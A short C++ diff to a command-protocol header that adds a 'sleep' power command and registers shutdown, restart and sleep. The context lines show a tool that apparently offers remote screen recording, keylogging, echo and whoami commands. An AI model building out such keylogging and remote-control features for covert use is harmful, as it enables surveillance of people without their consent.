@@ -43,6 +43,7 @@ namespace Protocol {
         // power
         static constexpr const char* SHUTDOWN = "shutdown";
         static constexpr const char* RESTART = "restart";
+        static constexpr const char* SLEEP = "sleep";
 
         static constexpr const char* ECHO = "echo";
         static constexpr const char* WHOAMI = "whoami";
@@ -81,6 +82,10 @@ namespace Protocol {
             TYPE::SCR_RECORD,
             TYPE::START_KEYLOG,
             TYPE::STOP_KEYLOG,
+
+            TYPE::SHUTDOWN,
+            TYPE::RESTART,
+            TYPE::SLEEP,
 
             TYPE::ECHO,
             TYPE::WHOAMI,
